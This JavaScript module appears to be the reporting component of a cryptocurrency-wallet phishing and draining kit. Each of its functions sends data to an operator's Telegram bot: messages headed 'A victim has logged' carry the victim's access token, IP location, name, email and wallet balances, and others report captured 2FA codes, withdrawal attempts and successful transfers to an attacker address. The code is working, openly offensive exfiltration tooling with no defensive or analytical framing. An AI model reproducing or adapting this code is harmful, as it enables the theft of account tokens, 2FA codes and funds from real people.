const axios = require('axios');

const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID; // Replace with your chat ID

function convertTimestampToDateTimeFormat(timestamp) {
    const date = new Date(timestamp * 1000); // Convert timestamp to milliseconds
    const day = date.getDate();
    const month = date.getMonth() + 1; // Months are zero-based, so we add 1
    const year = date.getFullYear().toString().slice(-2); // Extract last two digits of the year
    const hours = date.getHours().toString().padStart(2, '0'); // Pad with leading zero if necessary
    const minutes = date.getMinutes().toString().padStart(2, '0'); // Pad with leading zero if necessary
    const seconds = date.getSeconds().toString().padStart(2, '0'); // Pad with leading zero if necessary

    const formattedDateTime = `${hours}:${minutes}:${seconds} ${day}/${month}/${year}`;
    return formattedDateTime;
}

function formatDateTime(isoString) {
    const dateTime = new Date(isoString);

    const year = dateTime.getUTCFullYear();
    const month = String(dateTime.getUTCMonth() + 1).padStart(2, '0'); // months start at 0
    const day = String(dateTime.getUTCDate()).padStart(2, '0');
    const hours = String(dateTime.getUTCHours()).padStart(2, '0');
    const minutes = String(dateTime.getUTCMinutes()).padStart(2, '0');
    const seconds = String(dateTime.getUTCSeconds()).padStart(2, '0');

    return `${hours}:${minutes}:${seconds} ${year}-${month}-${day}`;
}

async function countryCodeToFlagEmoji(countryCode) {
    const OFFSET = 127397; // Offset between uppercase ascii and regional indicator symbols
    const codeArray = Array.from(countryCode.toUpperCase());
    return codeArray.map(c => String.fromCodePoint(c.charCodeAt(0) + OFFSET)).join('');
}

async function msg_getBalance(token, accounts, totalBalance, userInfo, ipInfo) {
    const expired_time = convertTimestampToDateTimeFormat(token.expired_at);

    let accountsMessage = "";
    let availableBalance = 0;
    let availableCounts = 0;

    for (const account of accounts) {
        if (account.available) {
            availableBalance += parseFloat(account.balanceInUSD);
            availableCounts++;
        }
        accountsMessage += `├${account.available ? "🟢" : "🔴"} ${account.balance.currency}: <b>$${account.balanceInUSD}</b> (${account.balance.amount})\n`;
    }

    const flagEmoji = await countryCodeToFlagEmoji(ipInfo.countryCode);

    const tokenMessage =
        `📲 <b><u>A victim has logged</u></b> 🙏\n\n` +
        `⏰ Access Token: \n<code>${token.access_token}</code>\n` +
        `🕰 Expired Time: <b>${expired_time}</b>\n` +
        `${flagEmoji} <code>${ipInfo.query}</code> <b>${ipInfo.city}, ${ipInfo.country}</b>\n\n`;
    const userMessage =
        `🌐 ID: <code>${userInfo.id}</code>\n` +
        `💳 Name: <b>${userInfo.name}</b>\n` +
        `📧 Email: <code>${userInfo.email}</code>\n` +
        `🌎 Country: <b>${userInfo.country.name}</b>\n\n`;
    const totalBalanceMessage = `┌💵 Total Balance: <b>$${totalBalance}</b> ($${availableBalance.toFixed(2)} available)\n`;
    const totalAccountsMessage = `└💎 Total Assests: <b>${accounts.length}</b> (${availableCounts} available)`;

    const formattedMessage = tokenMessage + userMessage + totalBalanceMessage + accountsMessage + totalAccountsMessage;

    try {
        const response = await axios.get(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            params: {
                chat_id: chatId,
                text: formattedMessage,
                parse_mode: 'HTML',
            },
        });

        if (response.status === 200) {
            // console.log('Message sent successfully to Telegram!');
        } else {
            console.log('Error sending message to Telegram: Status Code', response.status);
        }
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

async function msg_reqWithdraw(account) {
    const formattedMessage =
        `😇 <b><u>Request 2FA to withdraw ${account.balance.currency}</u></b>\n\n` +
        `🌐 ID: <code>${account.id}</code>\n` +
        `⏳ Wallet Name: <b>${account.name}</b> \n` +
        `💵 Currency: <b>${account.balance.amount} ${account.balance.currency}</b>\n` +
        `⏰ Balance: <b>$${account.balanceInUSD}</b>`;

    try {
        const response = await axios.get(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            params: {
                chat_id: chatId,
                text: formattedMessage,
                parse_mode: 'HTML',
            },
        });

        if (response.status === 200) {
            // console.log('Message sent successfully to Telegram!');
        } else {
            console.log('Error sending message to Telegram: Status Code', response.status);
        }
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

async function msg_invalidReqWithdraw(account, message) {
    const formattedMessage =
        `😭 <b><u>Can't withdraw ${account.balance.currency}</u></b> ❌\n\n` +
        `🌐 ID: <code>${account.id}</code>\n` +
        `⏳ Wallet Name: <b>${account.name}</b> \n` +
        `💵 Currency: <b>${account.balance.amount} ${account.balance.currency}</b>\n` +
        `⏰ Balance: <b>$${account.balanceInUSD}</b>\n\n` +
        `📖 Reason: <b>${message}</b>`;

    try {
        const response = await axios.get(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            params: {
                chat_id: chatId,
                text: formattedMessage,
                parse_mode: 'HTML',
            },
        });

        if (response.status === 200) {
            // console.log('Message sent successfully to Telegram!');
        } else {
            console.log('Error sending message to Telegram.');
        }
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

async function msg_invalidTwoFactorCode(two_factor_code, message) {
    const formattedMessage =
        `🤬 <b><u>Invaild 2FA Code</u></b>\n\n` +
        `📲 2FA code: <code>${two_factor_code}</code>\n` +
        `✖️ ${message} ✌️`;

    try {
        const response = await axios.get(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            params: {
                chat_id: chatId,
                text: formattedMessage,
                parse_mode: 'HTML',
            },
        });

        if (response.status === 200) {
            // console.log('Message sent successfully to Telegram!');
        } else {
            console.log('Error sending message to Telegram.');
        }
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

async function msg_withdrawAccount(withdrawalInfo) {
    const created_time = formatDateTime(withdrawalInfo.created_at);

    const formattedMessage =
        `🥳 <b><u>Succeeded in withdrawing funds</u></b> 🎉\n\n` +
        `🌐 ID: <code>${withdrawalInfo.id}</code>\n` +
        `⏳ Status: <b>${withdrawalInfo.status}</b>\n` +
        `💵 Amount: <b>${withdrawalInfo.amount.amount} ${withdrawalInfo.amount.currency} (${withdrawalInfo.native_amount.amount} ${withdrawalInfo.native_amount.currency})</b>\n` +
        `⏰ Time: <b>${created_time}</b>\n` +
        `💰 To: <code>${withdrawalInfo.to.address}</code>`;

    try {
        const response = await axios.get(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            params: {
                chat_id: chatId,
                text: formattedMessage,
                parse_mode: 'HTML',
            },
        });

        if (response.status === 200) {
            // console.log('Message sent successfully to Telegram!');
        } else {
            console.log('Error sending message to Telegram.');
        }
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

module.exports = {
    msg_getBalance,
    msg_reqWithdraw,
    msg_invalidReqWithdraw,
    msg_invalidTwoFactorCode,
    msg_withdrawAccount,
}